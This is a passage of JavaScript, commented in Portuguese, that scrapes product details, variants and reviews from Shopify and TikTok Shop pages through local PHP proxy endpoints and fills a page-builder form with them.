  for (const script of Array.from(doc.querySelectorAll('script[type="application/ld+json"]'))) {
    const txt = (script.textContent || '').trim();
    if (!txt) continue;
    try {
      const parsed = JSON.parse(txt);
      const items = Array.isArray(parsed) ? parsed : [parsed];
      for (const item of items) {
        if (item && item['@type'] === 'Product') return item;
      }
    } catch (e) {}
  }
  return null;
}

function parseShopifyProductJson(data, sourceUrl = '', extraReviewData = null, extraDescriptionData = null) {
  const rawDescriptionHtml = (extraDescriptionData && extraDescriptionData.rawDescriptionHtml) || data.description || data.body_html || '';
  const fallbackDescriptionImages = extractDescriptionImagesFromHtml(rawDescriptionHtml, sourceUrl);
  const descriptionText = (extraDescriptionData && extraDescriptionData.descriptionText) || htmlToPlainTextPreserveBreaks(rawDescriptionHtml);
  const descriptionImages = (extraDescriptionData && extraDescriptionData.descriptionImages && extraDescriptionData.descriptionImages.length) ? extraDescriptionData.descriptionImages : fallbackDescriptionImages;
  const descriptionBlocks = (extraDescriptionData && extraDescriptionData.descriptionBlocks && extraDescriptionData.descriptionBlocks.length) ? extraDescriptionData.descriptionBlocks : extractOrderedDescriptionBlocks(rawDescriptionHtml, sourceUrl);

  const rawImages = Array.isArray(data.images) ? data.images : [];
  const imageObjects = rawImages.map(img => {
    if (typeof img === 'string') return { src: absolutizeUrl(img, sourceUrl), id: null };
    return { src: absolutizeUrl(img.src || img.url || (img.preview_image && img.preview_image.src) || '', sourceUrl), id: img.id != null ? String(img.id) : null };
  }).filter(img => img.src);
  const allImages = imageObjects.map(img => img.src);

  const variants = Array.isArray(data.variants) ? data.variants : [];
  const firstVariant = variants.find(v => v && v.available) || variants[0] || null;
  const currentPrice = firstVariant ? formatExtractedPrice(firstVariant.price != null ? firstVariant.price : data.price) : formatExtractedPrice(data.price || '0');
  const originalPrice = firstVariant && firstVariant.compare_at_price != null && Number(firstVariant.compare_at_price) > Number(firstVariant.price || 0)
    ? formatExtractedPrice(firstVariant.compare_at_price)
    : (data.compare_at_price != null ? formatExtractedPrice(data.compare_at_price) : '');

  const optionNames = Array.isArray(data.options) ? data.options.map(opt => typeof opt === 'string' ? opt : (opt.name || '')).filter(Boolean) : [];
  const colorMap = new Map();
  const sizeSet = new Set();
  const genericOptions = [[], [], []];

  const isColorName = (name) => /cor|color|colour/i.test(String(name || ''));
  const isSizeName = (name) => /tamanho|tam|size/i.test(String(name || ''));
  const looksLikeSize = (val) => /^(pp|p|m|g|gg|xg|xgg|xs|s|l|xl|xxl|u|único|unico|34|35|36|37|38|39|40|41|42|43|44|45|46)$/i.test(String(val || '').trim());

  function getVariantImage(v) {
    const featured = absolutizeUrl((v && v.featured_image && (v.featured_image.src || v.featured_image.url)) || '', sourceUrl);
    if (featured) return featured;
    const imageId = v && (v.image_id != null ? String(v.image_id) : (v.featured_image && v.featured_image.id != null ? String(v.featured_image.id) : null));
    if (imageId) {
      const found = imageObjects.find(img => img.id === imageId);
      if (found) return found.src;
    }
    return allImages[0] || '';
  }

  variants.forEach(v => {
    const values = [v.option1, v.option2, v.option3].map(s => String(s || '').trim());
    values.forEach((val, idx) => { if (val) genericOptions[idx].push(val); });
    values.forEach((val, idx) => {
      if (!val) return;
      const optionName = optionNames[idx] || `Opção ${idx + 1}`;
      if (isColorName(optionName)) {
        if (!colorMap.has(val)) {
          colorMap.set(val, normalizeColorObject({
            name: val,
            imageUrl: getVariantImage(v),
            price: v.price != null ? formatExtractedPrice(v.price) : currentPrice,
            originalPrice: v.compare_at_price != null && Number(v.compare_at_price) > Number(v.price || 0) ? formatExtractedPrice(v.compare_at_price) : originalPrice,
            checkoutUrl: ''
          }, allImages[0] || '', currentPrice, originalPrice));
        }
      } else if (isSizeName(optionName)) {
        sizeSet.add(val);
      }
    });
  });

  if (colorMap.size === 0 && genericOptions[0].length) {
    Array.from(new Set(genericOptions[0].filter(Boolean))).forEach(val => {
      if (!looksLikeSize(val)) colorMap.set(val, normalizeColorObject(val, allImages[0] || '', currentPrice, originalPrice));
    });
  }
  if (sizeSet.size === 0) {
    const source = genericOptions[1].length ? genericOptions[1] : genericOptions[0];
    Array.from(new Set(source.filter(Boolean))).forEach(val => { if (looksLikeSize(val)) sizeSet.add(val); });
  }

  return {
    title: data.title || data.name || '',
    price: currentPrice,
    oldPrice: originalPrice,
    imageUrl: allImages[0] || '',
    description: descriptionText,
    productTitle: data.title || data.name || '',
    currentPrice,
    originalPrice,
    mainImage: allImages[0] || '',
    additionalImages: allImages.slice(1),
    productDescription: descriptionText,
    rawDescriptionHtml: rawDescriptionHtml,
    descriptionImages,
    descriptionBlocks,
    productRating: extraReviewData?.rating || '',
    reviewCount: extraReviewData?.reviewCount || '',
    salesCount: '',
    storeName: data.vendor || data.brand || '',
    storeLogoUrl: '',
    colors: Array.from(colorMap.values()),
    sizes: Array.from(sizeSet.values()),
    reviews: Array.isArray(extraReviewData?.reviews) ? extraReviewData.reviews : []
  };
}

async function fetchAndParseProductData(url, statusDiv) {
    try {
        const originalUrl = String(url || '').trim();
        if (!originalUrl) throw new Error("URL invalida.");
        const normalizedUrl = normalizeProductUrl(originalUrl);

        if (isShopifyProductUrl(normalizedUrl)) {
            if (statusDiv) statusDiv.innerText = "Buscando produto Shopify...";
            let doc = null;
            let reviewData = { rating: "", reviewCount: "", reviews: [] };
            let extraDescriptionData = { descriptionImages: [], descriptionText: "", descriptionBlocks: [], rawDescriptionHtml: "" };

            try {
                const htmlResponse = await fetch(`parser.php?url=${encodeURIComponent(normalizedUrl)}`);
                const html = await htmlResponse.text();
                const parser = new DOMParser();
                doc = parser.parseFromString(html, 'text/html');
                reviewData = extractReviewDataFromHtml(doc);
                const htmlDesc = extractDescriptionHtml(doc);
                extraDescriptionData = {
                    descriptionImages: extractDescriptionImagesFromHtml(htmlDesc || doc, normalizedUrl),
                    descriptionText: htmlToPlainTextPreserveBreaks(htmlDesc || ''),
                    rawDescriptionHtml: htmlDesc || ''
                };
            } catch (e) {
                console.warn('Falha ao carregar HTML Shopify', e);
            }

            try {
                const jsUrl = buildShopifyProductJsonUrl(normalizedUrl);
                const jsResponse = await fetch(`parser.php?url=${encodeURIComponent(jsUrl)}`);
                const rawJs = await jsResponse.text();
                let shopifyData = null;
                try { shopifyData = JSON.parse(rawJs); } catch (e) {}
                // Shopify .js retorna { product: {...} } - extrair o objeto interno
                if (shopifyData && shopifyData.product) {
                    shopifyData = shopifyData.product;
                }
                if (shopifyData && (shopifyData.title || shopifyData.variants || shopifyData.images)) {
                    if (statusDiv) statusDiv.innerText = 'Produto Shopify extraido com sucesso';
                    // Se extraDescriptionData.rawDescriptionHtml estiver vazio, usar body_html do JSON
                    if ((!extraDescriptionData.rawDescriptionHtml || extraDescriptionData.rawDescriptionHtml.trim() === '') && shopifyData.body_html) {
                        extraDescriptionData.rawDescriptionHtml = shopifyData.body_html;
                    }
                    return parseShopifyProductJson(shopifyData, normalizedUrl, reviewData, extraDescriptionData);
                }
            } catch (e) {
                console.warn('Falha ao buscar .js Shopify', e);
            }

            if (doc) {
                let embedded = extractShopifyJsonFromHtml(doc);
                if (embedded) {
                    // Shopify pode retornar { product: {...} }
                    if (embedded.product) embedded = embedded.product;
                    if (statusDiv) statusDiv.innerText = 'Produto Shopify extraido do HTML';
                    // Se extraDescriptionData.rawDescriptionHtml estiver vazio, usar body_html do JSON
                    if ((!extraDescriptionData.rawDescriptionHtml || extraDescriptionData.rawDescriptionHtml.trim() === '') && embedded.body_html) {
                        extraDescriptionData.rawDescriptionHtml = embedded.body_html;
                    }
                    return parseShopifyProductJson(embedded, normalizedUrl, reviewData, extraDescriptionData);
                }

                const ogTitle = doc.querySelector('meta[property="og:title"]');
                const ogImage = doc.querySelector('meta[property="og:image"]');
                const ogDesc = doc.querySelector('meta[property="og:description"]');
                const title = (ogTitle ? ogTitle.content : '') || (doc.querySelector('h1') ? doc.querySelector('h1').innerText.trim() : '');
                if (title) {
                    return {
                        title,
                        price: '0,00',
                        oldPrice: '',
                        imageUrl: ogImage ? ogImage.content : '',
                        description: extraDescriptionData.descriptionText || (ogDesc ? ogDesc.content : ''),
                        productTitle: title,
                        currentPrice: '0,00',
                        originalPrice: '',
                        mainImage: ogImage ? ogImage.content : '',
                        additionalImages: [],
                        productDescription: extraDescriptionData.descriptionText || (ogDesc ? ogDesc.content : ''),
                        rawDescriptionHtml: extraDescriptionData.rawDescriptionHtml || '',
                        descriptionImages: extraDescriptionData.descriptionImages || [],
                        descriptionBlocks: extraDescriptionData.descriptionBlocks || [],
                        productRating: reviewData.rating || '',
                        reviewCount: reviewData.reviewCount || '',
                        salesCount: '',
                        storeName: '',
                        storeLogoUrl: '',
                        colors: [],
                        sizes: [],
                        reviews: reviewData.reviews || []
                    };
                }
            }

            throw new Error('Nao foi possivel extrair os dados da pagina Shopify.');
        }

        // ===================== TikTok Shop =====================
        if (isTikTokShopUrl(normalizedUrl)) {
            if (statusDiv) statusDiv.innerText = "Extraindo dados do TikTok Shop...";
            
            // Metodo unico: Extrair dados do og_info na URL (evita CAPTCHA do TikTok)
            const urlData = extractTikTokDataFromUrl(normalizedUrl);
            if (urlData && urlData.title && urlData.title !== 'Security Check') {
                if (statusDiv) statusDiv.innerText = 'Produto TikTok Shop extraido com sucesso';
                return urlData;
            }
            
            throw new Error('Nao foi possivel extrair os dados do TikTok Shop. Certifique-se de que a URL esta completa com os parametros og_info.');
        }

        if (statusDiv) statusDiv.innerText = "Buscando via parser...";
        try {
            const parserResponse = await fetch(`parser.php?url=${encodeURIComponent(originalUrl)}`);
            const rawText = await parserResponse.text();
            let parserData = null;
            try { parserData = JSON.parse(rawText); } catch (e) {}
            if (parserData && parserData.success && parserData.title) {
                if (statusDiv) statusDiv.innerText = `Dados extraidos via ${parserData.source}`;
                const result = {
                    title: parserData.title || "",
                    price: parserData.price || "0,00",
                    oldPrice: parserData.oldPrice || "",
                    imageUrl: parserData.imageUrl || "",
                    description: parserData.description || "",
                    productTitle: parserData.title || "",
                    currentPrice: parserData.price || "0,00",
                    originalPrice: parserData.oldPrice || "",
                    mainImage: parserData.imageUrl || "",
                    productDescription: parserData.description || "",
                    rawDescriptionHtml: parserData.rawDescriptionHtml || parserData.description || "",
                    descriptionImages: parserData.descriptionImages || [],
                    descriptionBlocks: parserData.descriptionBlocks || [],
                    productRating: parserData.rating || "",
                    reviewCount: parserData.reviewCount || "",
                    salesCount: parserData.salesCount || "",
                    storeName: parserData.storeName || "",
                    storeLogoUrl: parserData.storeLogoUrl || "",
                    additionalImages: parserData.additionalImages || [],
                    reviews: parserData.reviews || []
                };
                if (parserData.colors && parserData.colors.length > 0) result.colors = parserData.colors;
                if (parserData.sizes && parserData.sizes.length > 0) result.sizes = parserData.sizes;
                return result;
            }
        } catch (parserError) {
            console.warn("parser.php falhou, tentando fallbacks...", parserError);
        }

        if (statusDiv) statusDiv.innerText = "Tentando extrair da URL...";
        try {
            const urlObj = new URL(originalUrl);
            const ogInfoParam = urlObj.searchParams.get('og_info');
            if (ogInfoParam) {
                const ogInfo = JSON.parse(decodeURIComponent(ogInfoParam));
                if (ogInfo && ogInfo.title) {
                    if (statusDiv) statusDiv.innerText = "Dados basicos extraidos da URL (og_info)";
                    return {
                        title: ogInfo.title || "",
                        price: "0,00",
                        oldPrice: "",
                        imageUrl: ogInfo.image || "",
                        description: "",
                        productTitle: ogInfo.title || "",
                        currentPrice: "0,00",
                        originalPrice: "",
                        mainImage: ogInfo.image || "",
                        productDescription: "",
                        descriptionImages: []
                    };
                }
            }
        } catch (ogError) {
            console.warn("og_info fallback falhou:", ogError);
        }

        if (statusDiv) statusDiv.innerText = "Tentando via proxy direto...";
        const response = await fetch(`proxy.php?url=${encodeURIComponent(originalUrl)}`);
        const html = await response.text();
        if (!html || html.length < 600) throw new Error("O TikTok bloqueou a leitura automatica ou o link e invalido.");

        const jsonMatch = html.match(/<script[^>]*id="__MODERN_ROUTER_DATA__"[^>]*>([\s\S]*?)<\/script>/);
        if (jsonMatch && jsonMatch[1]) {
            try {
                const routerData = JSON.parse(jsonMatch[1]);
                const loaderData = routerData.loaderData || {};
                let pageData = null;
                for (const key in loaderData) {
                    if (loaderData[key] && typeof loaderData[key] === 'object' && loaderData[key].getProductDetail) {
                        pageData = loaderData[key];
                        break;
                    }
                }
                if (pageData) {
                    const detail = pageData.getProductDetail || {};
                    const reviewInfo = pageData.getProductReviewInfo || {};
                    const shopInfo = pageData.getShopInfo || {};
                    const d = detail.data || detail;
                    const r = reviewInfo.data || reviewInfo;
                    const s = shopInfo.data || shopInfo;
                    let images = [];
                    const imgSource = d.images || d.image || [];
                    if (Array.isArray(imgSource)) {
                        images = imgSource.map(img => typeof img === 'string' ? img : (img.url || img.imageUrl || img.thumbUrl || img.originUrl || '')).filter(Boolean);
                    }
                    let price = '0,00';
                    let oldPrice = '';
                    const priceObj = d.price || d.salePrice || {};
                    if (typeof priceObj === 'object') {
                        price = priceObj.salePrice || priceObj.price || priceObj.currentPrice || priceObj.min || '0,00';
                        oldPrice = priceObj.markedPrice || priceObj.originalPrice || priceObj.max || '';
                    } else if (priceObj) {
                        price = String(priceObj);
                    }
                    price = formatExtractedPrice(price);
                    oldPrice = formatExtractedPrice(oldPrice);
                    if (statusDiv) statusDiv.innerText = 'Dados extraidos do JSON (client-side)';
                    return {
                        title: d.title || d.name || d.productTitle || '',
                        price,
                        oldPrice,
                        imageUrl: images[0] || '',
                        description: d.desc || d.description || d.richText || '',
                        productTitle: d.title || d.name || '',
                        currentPrice: price,
                        originalPrice: oldPrice,
                        mainImage: images[0] || '',
                        additionalImages: images.slice(1),
                        productDescription: d.desc || d.description || '',
                        descriptionImages: [],
                        productRating: r.averageStar || r.averageRating || r.rating || '',
                        reviewCount: r.totalReview || r.reviewCount || r.total || '',
                        salesCount: d.soldCount || d.sales || d.sold || '',
                        storeName: s.shopName || s.name || s.storeName || '',
                        storeLogoUrl: s.shopLogo || s.logo || s.avatarUrl || '',
                        colors: d.colors || [],
                        sizes: d.sizes || [],
                        reviews: r.reviews || []
                    };
                }
            } catch (jsonError) {
                console.warn('Falha ao parsear __MODERN_ROUTER_DATA__:', jsonError);
            }
        }

        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const ogTitle = doc.querySelector('meta[property="og:title"]');
        const ogImage = doc.querySelector('meta[property="og:image"]');
        const ogDesc = doc.querySelector('meta[property="og:description"]');
        const title = (ogTitle ? ogTitle.content : '') || (doc.querySelector('h1') ? doc.querySelector('h1').innerText : '');
        if (!title) throw new Error('Nao foi possivel extrair dados. O TikTok pode ter bloqueado o acesso.');
        return {
            title,
            price: '0,00',
            oldPrice: '',
            imageUrl: ogImage ? ogImage.content : '',
            description: ogDesc ? ogDesc.content : '',
            productTitle: title,
            currentPrice: '0,00',
            originalPrice: '',
            mainImage: ogImage ? ogImage.content : '',
            productDescription: ogDesc ? ogDesc.content : '',
            descriptionImages: []
        };
    } catch (error) {
        throw new Error(error.message || 'Erro desconhecido ao extrair dados do produto.');
    }
}


/**
 * Formata preco extraido do JSON para formato brasileiro (virgula)
 */
function formatExtractedPrice(val) {
    if (!val) return "";
    val = String(val).replace(/R\$|BRL|\$/g, "").trim();
    // Se ja tem virgula, retorna
    if (val.includes(",")) return val;
    // Se tem ponto decimal, troca por virgula
    if (val.includes(".")) return val.replace(".", ",");
    // Se e inteiro grande (centavos), converte
    const num = parseInt(val);
    if (!isNaN(num) && num > 1000) {
        return (num / 100).toFixed(2).replace(".", ",");
    }
    return val;
}

async function fetchMainProduct() {
  const urlInput = el("main-product-url-input");
  const statusDiv = el("main-product-loading-status");
  const productUrl = urlInput.value;
  if (!productUrl) { alert("Insira o link."); return; }
  
  if (typeof fetchAndParseProductData !== 'function') {
      alert("Parser não encontrado. Por favor, preencha os dados manualmente.");
      return;
  }

  try {
    statusDiv.innerText = "Buscando dados...";
    const extractedData = await fetchAndParseProductData(productUrl, statusDiv);
    const currentFooterData = getFooterData();
    const currentLang = val("site-language");
    const mergedData = { ...extractedData, ...currentFooterData };
    if(currentLang) mergedData.siteLanguage = currentLang;
    
    populateForm(mergedData);
    updateOutput();
    statusDiv.innerText = "✅ Sucesso!";
  } catch (error) { statusDiv.innerText = `❌ Erro: ${error.message}`; }
}

// Funcao para extrair dados do TikTok Shop a partir do JSON colado pelo usuario
function extractTikTokFromJson() {
  const jsonInput = document.getElementById("tiktok-json-input");
  const statusDiv = document.getElementById("tiktok-json-status");
  
  if (!jsonInput) {
    alert("Elemento tiktok-json-input nao encontrado!");
    return;
  }
  
  const rawInput = (jsonInput.value || '').trim();
  
  if (!rawInput) {
    alert("Cole os dados extraidos do TikTok Shop no campo de texto.");
    return;
  }
  
  if (statusDiv) statusDiv.innerText = "Processando...";
  
  try {
    // Tentar parsear diretamente (JSON do script do Console)
    let data;
    try {
      data = JSON.parse(rawInput);
    } catch (e) {
      // Se falhar, tentar encontrar JSON no texto
      const jsonMatch = rawInput.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        data = JSON.parse(jsonMatch[0]);
      } else {
        throw new Error("JSON invalido. Execute o script no Console do TikTok Shop primeiro.");
      }
    }
    
    // Verificar se e o formato do script do Console (tem title, images, price)
    const extractedData = {
      title: data.title || '',
      price: data.price || '0,00',
      oldPrice: data.oldPrice || '',
      imageUrl: data.images?.[0] || '',
      description: data.description || '',
      productTitle: data.title || '',
      currentPrice: data.price || '0,00',
      originalPrice: data.oldPrice || '',
      mainImage: data.images?.[0] || '',
      additionalImages: data.images?.slice(1) || [],
      productDescription: data.description || '',
      rawDescriptionHtml: data.description || '',
      descriptionImages: [],
      descriptionBlocks: [],
      productRating: data.rating || '',
      reviewCount: data.reviewCount || '',
      salesCount: data.salesCount || '',
      storeName: data.storeName || '',
      storeLogoUrl: data.storeLogo || '',
      colors: [],
      sizes: [],
      reviews: data.reviews || []
    };
    
    // Se nao encontrou dados basicos, tentar extracao avancada (JSON da API)
    if (!extractedData.title) {
      const advanced = extractTikTokProductData(data);
      if (advanced.title) {
        Object.assign(extractedData, advanced);
      }
    }
    
    if (!extractedData.title) {
      throw new Error("Nao foi possivel encontrar dados do produto. Execute o script no Console do TikTok Shop.");
    }
    
    // Preencher formulario
    const currentFooterData = typeof getFooterData === 'function' ? getFooterData() : {};
    const currentLang = typeof val === 'function' ? val("site-language") : '';
    const mergedData = { ...extractedData, ...currentFooterData };
    if(currentLang) mergedData.siteLanguage = currentLang;
    
    if (typeof populateForm === 'function') populateForm(mergedData);
    if (typeof updateOutput === 'function') updateOutput();
    
    let successMsg = "Dados extraidos: " + extractedData.title.substring(0, 30) + "...";
    if (extractedData.mainImage) successMsg += " | 1+ imagem";
    if (extractedData.reviews?.length) successMsg += " | " + extractedData.reviews.length + " avaliacoes";
    if (statusDiv) statusDiv.innerText = successMsg;
    
  } catch (error) {
    alert("Erro: " + error.message);
    if (statusDiv) statusDiv.innerText = "Erro: " + error.message;
  }
}

// Funcao inteligente para extrair dados do produto de qualquer estrutura JSON do TikTok
function extractTikTokProductData(data) {
  const result = {
    title: '',
    price: '0,00',
    oldPrice: '',
    imageUrl: '',
    description: '',
    productTitle: '',
    currentPrice: '0,00',
    originalPrice: '',
    mainImage: '',
    additionalImages: [],
    productDescription: '',
    rawDescriptionHtml: '',
    descriptionImages: [],
    descriptionBlocks: [],
    productRating: '',
    reviewCount: '',
    salesCount: '',
    storeName: '',
    storeLogoUrl: '',
    colors: [],
    sizes: [],
    reviews: []
  };
  
  // Primeiro: tentar extrair og_info de URLs encoded no JSON
  const jsonStr = JSON.stringify(data);
  
  // Helper para decodificar multiplas vezes
  function multiDecode(str) {
    let decoded = str;
    for (let i = 0; i < 10; i++) {
      try {
        let temp = decoded.replace(/%25/g, '%').replace(/\\u002F/g, '/').replace(/\\\//g, '/');
        const newDecoded = decodeURIComponent(temp);
        if (newDecoded === decoded) break;
        decoded = newDecoded;
      } catch (e) {
        try {
          const newDecoded = decodeURIComponent(decoded);
          if (newDecoded === decoded) break;
          decoded = newDecoded;
        } catch (e2) { break; }
      }
    }
    return decoded.replace(/\+/g, ' ');
  }
  
  // Procurar titulo diretamente no texto encoded
  if (!result.title) {
    // Procurar pattern %22title%22%3A%22 ou "title":"
    const titlePatterns = [
      /%2522title%2522%253A%2522([^%]+(?:%[^%2]+)*?)%2522/i,
      /%22title%22%3A%22([^%]+(?:%[^%]+)*?)%22/i,
      /"title"\s*:\s*"([^"]+)"/
    ];
    for (const pattern of titlePatterns) {
      const match = jsonStr.match(pattern);
      if (match && match[1]) {
        result.title = multiDecode(match[1]).replace(/\u00A0/g, ' ');
        if (result.title.length > 5) break;
      }
    }
  }
  
  // Procurar imagem diretamente no texto encoded
  if (!result.mainImage) {
    // Procurar URLs de imagem do TikTok
    const imgPatterns = [
      /%2522image%2522%253A%2522(https?[^%]*(?:%[^%2]+)*?)%2522/i,
      /%22image%22%3A%22(https?[^%]+(?:%[^%]+)*?)%22/i,
      /"image"\s*:\s*"(https?[^"]+)"/
    ];
    for (const pattern of imgPatterns) {
      const match = jsonStr.match(pattern);
      if (match && match[1]) {
        let imgUrl = multiDecode(match[1]);
        if (imgUrl.includes('ibyteimg') || imgUrl.includes('tiktokcdn')) {
          result.mainImage = cleanTikTokImageUrl(imgUrl);
          break;
        }
      }
    }
    
    // Fallback: procurar qualquer URL de imagem do TikTok
    if (!result.mainImage) {
      const fallbackMatch = jsonStr.match(/https?[:%253]+[^"'\s\\]*(?:ibyteimg|tiktokcdn)[^"'\s\\]*\.(?:webp|jpg|jpeg|png)/i);
      if (fallbackMatch) {
        result.mainImage = cleanTikTokImageUrl(multiDecode(fallbackMatch[0]));
      }
    }
  }
  
  // Segundo: verificar productInfoStructure (formato pdp_data)
  if (data.data?.productInfoStructure?.productInfo?.product_base?.price) {
    const priceData = data.data.productInfoStructure.productInfo.product_base.price;
    if (priceData.real_price) {
      result.currentPrice = priceData.real_price.replace(/[^\d,]/g, '');
      result.price = result.currentPrice;
    } else if (priceData.min_sku_price) {
      result.currentPrice = priceData.min_sku_price;
      result.price = result.currentPrice;
    }
    if (priceData.original_price) {
      result.originalPrice = priceData.original_price.replace(/[^\d,]/g, '');
      result.oldPrice = result.originalPrice;
    } else if (priceData.min_sku_original_price) {
      result.originalPrice = priceData.min_sku_original_price;
      result.oldPrice = result.originalPrice;
    }
  }
  
  // Terceiro: buscar recursivamente por outros dados
  searchAndExtract(data, result, 0);
  
  // Copiar campos para formato esperado
  result.productTitle = result.title;
  result.imageUrl = result.mainImage;
  result.productDescription = result.description;
  result.rawDescriptionHtml = result.description;
  
  return result;
}

// Busca recursiva inteligente
function searchAndExtract(obj, result, depth) {
  if (depth > 15 || !obj || typeof obj !== 'object') return;
  
  // Arrays
  if (Array.isArray(obj)) {
    for (const item of obj) {
      searchAndExtract(item, result, depth + 1);
    }
    return;
  }
  
  const keys = Object.keys(obj);
  
  // Extrair titulo
  if (!result.title && obj.title && typeof obj.title === 'string' && obj.title.length > 5) {
    result.title = obj.title;
  }
  if (!result.title && obj.name && typeof obj.name === 'string' && obj.name.length > 5) {
    result.title = obj.name;
  }
  
  // Extrair descricao
  if (!result.description && obj.description && typeof obj.description === 'string') {
    result.description = obj.description;
  }
  if (!result.description && obj.desc && typeof obj.desc === 'string') {
    result.description = obj.desc;
  }
  
  // Extrair preco
  if (result.currentPrice === '0,00') {
    let price = obj.salePrice || obj.sale_price || obj.discountPrice || obj.discount_price || obj.price;
    if (price) {
      if (typeof price === 'object') price = price.price || price.value || price.amount;
      if (typeof price === 'string') price = parseFloat(price.replace(/[^\d.]/g, ''));
      if (typeof price === 'number' && price > 0) {
        // Se muito grande, provavelmente centavos
        if (price > 10000) price = price / 100;
        result.currentPrice = price.toFixed(2).replace('.', ',');
        result.price = result.currentPrice;
      }
    }
  }
  
  // Extrair preco original
  if (!result.originalPrice) {
    let origPrice = obj.originalPrice || obj.original_price || obj.marketPrice || obj.market_price;
    if (origPrice) {
      if (typeof origPrice === 'object') origPrice = origPrice.price || origPrice.value || origPrice.amount;
      if (typeof origPrice === 'string') origPrice = parseFloat(origPrice.replace(/[^\d.]/g, ''));
      if (typeof origPrice === 'number' && origPrice > 0) {
        if (origPrice > 10000) origPrice = origPrice / 100;
        result.originalPrice = origPrice.toFixed(2).replace('.', ',');
        result.oldPrice = result.originalPrice;
      }
    }
  }
  
  // Extrair imagem principal
  if (!result.mainImage) {
    let img = obj.image || obj.cover || obj.mainImage || obj.main_image || obj.thumb;
    if (img) {
      if (typeof img === 'object') {
        img = img.url || img.uri || img.src || (img.url_list && img.url_list[0]);
      }
      if (typeof img === 'string' && img.includes('http')) {
        result.mainImage = cleanTikTokImageUrl(img);
      }
    }
  }
  
  // Extrair imagens adicionais
  if (obj.images && Array.isArray(obj.images) && result.additionalImages.length === 0) {
    for (const img of obj.images) {
      let imgUrl = '';
      if (typeof img === 'string') imgUrl = img;
      else if (img && typeof img === 'object') {
        imgUrl = img.url || img.uri || img.src || (img.url_list && img.url_list[0]) || (img.thumb && img.thumb.url_list && img.thumb.url_list[0]);
      }
      if (imgUrl && imgUrl.includes('http')) {
        const cleanUrl = cleanTikTokImageUrl(imgUrl);
        if (!result.additionalImages.includes(cleanUrl) && cleanUrl !== result.mainImage) {
          result.additionalImages.push(cleanUrl);
        }
      }
    }
    // Se nao tem mainImage, usar primeira das adicionais
    if (!result.mainImage && result.additionalImages.length > 0) {
      result.mainImage = result.additionalImages.shift();
    }
  }
  
  // Extrair rating
  if (!result.productRating) {
    const rating = obj.rating || obj.averageRating || obj.average_rating || obj.avgRating || obj.avg_rating || obj.score;
    if (rating && (typeof rating === 'number' || typeof rating === 'string')) {
      result.productRating = String(rating);
    }
  }
  
  // Extrair contagem de reviews
  if (!result.reviewCount) {
    const count = obj.reviewCount || obj.review_count || obj.totalReviewCount || obj.total_review_count || obj.reviewNum || obj.review_num;
    if (count && (typeof count === 'number' || typeof count === 'string')) {
      result.reviewCount = String(count);
    }
  }
  
  // Extrair vendas
  if (!result.salesCount) {
    const sales = obj.soldCount || obj.sold_count || obj.salesCount || obj.sales_count || obj.sold || obj.displaySoldCount;
    if (sales && (typeof sales === 'number' || typeof sales === 'string')) {
      result.salesCount = String(sales);
    }
  }
  
  // Extrair info da loja
  if (!result.storeName) {
    const shop = obj.shop || obj.seller || obj.store;
    if (shop && typeof shop === 'object') {
      result.storeName = shop.name || shop.shopName || shop.shop_name || shop.sellerName || '';
      const logo = shop.logo || shop.avatar || shop.icon;
      if (logo) {
        result.storeLogoUrl = typeof logo === 'string' ? cleanTikTokImageUrl(logo) : cleanTikTokImageUrl(logo.url || logo.uri || '');
      }
    }
    if (!result.storeName && obj.shopName) result.storeName = obj.shopName;
    if (!result.storeName && obj.sellerName) result.storeName = obj.sellerName;
  }
  
  // Extrair reviews
  if (result.reviews.length === 0) {
    const reviewList = obj.reviews || obj.reviewList || obj.review_list || obj.list;
    if (reviewList && Array.isArray(reviewList) && reviewList.length > 0) {
      // Verificar se parece ser lista de reviews
      const firstItem = reviewList[0];
      if (firstItem && (firstItem.content || firstItem.comment || firstItem.text || firstItem.rating)) {
        for (const r of reviewList.slice(0, 20)) {
          const reviewImages = [];
          const rImages = r.images || r.imageList || r.image_list || r.pics || [];
          if (Array.isArray(rImages)) {
            for (const rImg of rImages.slice(0, 5)) {
              let imgUrl = typeof rImg === 'string' ? rImg : (rImg.url || rImg.uri || (rImg.url_list && rImg.url_list[0]) || '');
              if (imgUrl) reviewImages.push(cleanTikTokImageUrl(imgUrl));
            }
          }
          
          let author = r.userName || r.user_name || r.authorName || r.author_name || r.nickname || '';
          if (!author && r.author) author = typeof r.author === 'string' ? r.author : (r.author.name || r.author.nickname || '');
          if (!author && r.user) author = typeof r.user === 'string' ? r.user : (r.user.name || r.user.nickname || '');
          if (!author) author = 'Usuario';
          
          const reviewText = r.content || r.comment || r.text || r.reviewContent || r.review_content || '';
          const reviewRating = r.rating || r.score || r.star || 5;
          
          if (reviewText || reviewImages.length > 0) {
            result.reviews.push({
              author: author,
              rating: parseInt(reviewRating) || 5,
              text: reviewText,
              images: reviewImages
            });
          }
        }
      }
    }
  }
  
  // Extrair variacoes (cores/tamanhos)
  if (result.colors.length === 0 || result.sizes.length === 0) {
    const skus = obj.skuInfos || obj.sku_infos || obj.skus || obj.variants;
    if (skus && Array.isArray(skus)) {
      const colorNames = [];
      const sizeNames = [];
      for (const sku of skus) {
        const specs = sku.specList || sku.spec_list || sku.specs || sku.options || [];
        let skuImg = '';
        if (sku.skuImage || sku.sku_image || sku.image) {
          const img = sku.skuImage || sku.sku_image || sku.image;
          skuImg = typeof img === 'string' ? img : (img.url || img.uri || '');
        }
        
        for (const spec of specs) {
          const specName = (spec.specName || spec.spec_name || spec.name || '').toLowerCase();
          const specValue = spec.specValue || spec.spec_value || spec.value || '';
          
          if ((specName.includes('cor') || specName.includes('color') || specName.includes('colour')) && specValue) {
            if (!colorNames.includes(specValue)) {
              colorNames.push(specValue);
              result.colors.push({ name: specValue, imageUrl: cleanTikTokImageUrl(skuImg), price: '' });
            }
          } else if ((specName.includes('tamanho') || specName.includes('size') || specName.includes('numero')) && specValue) {
            if (!sizeNames.includes(specValue)) {
              sizeNames.push(specValue);
              result.sizes.push(specValue);
            }
          }
        }
      }
    }
  }
  
  // Continuar buscando recursivamente em sub-objetos
  for (const key of keys) {
    if (obj[key] && typeof obj[key] === 'object') {
      searchAndExtract(obj[key], result, depth + 1);
    }
  }
}

async function fetchProductForRecommendation() {
  const urlInput = el("rec-product-url-input");
  const statusDiv = el("rec-loading-status");
  const productUrl = urlInput.value;
  if (!productUrl) { alert("Insira o link."); return; }

  if (typeof fetchAndParseProductData !== 'function') {
      alert("Parser não encontrado. Adicione manualmente.");
      return;
  }

  try {
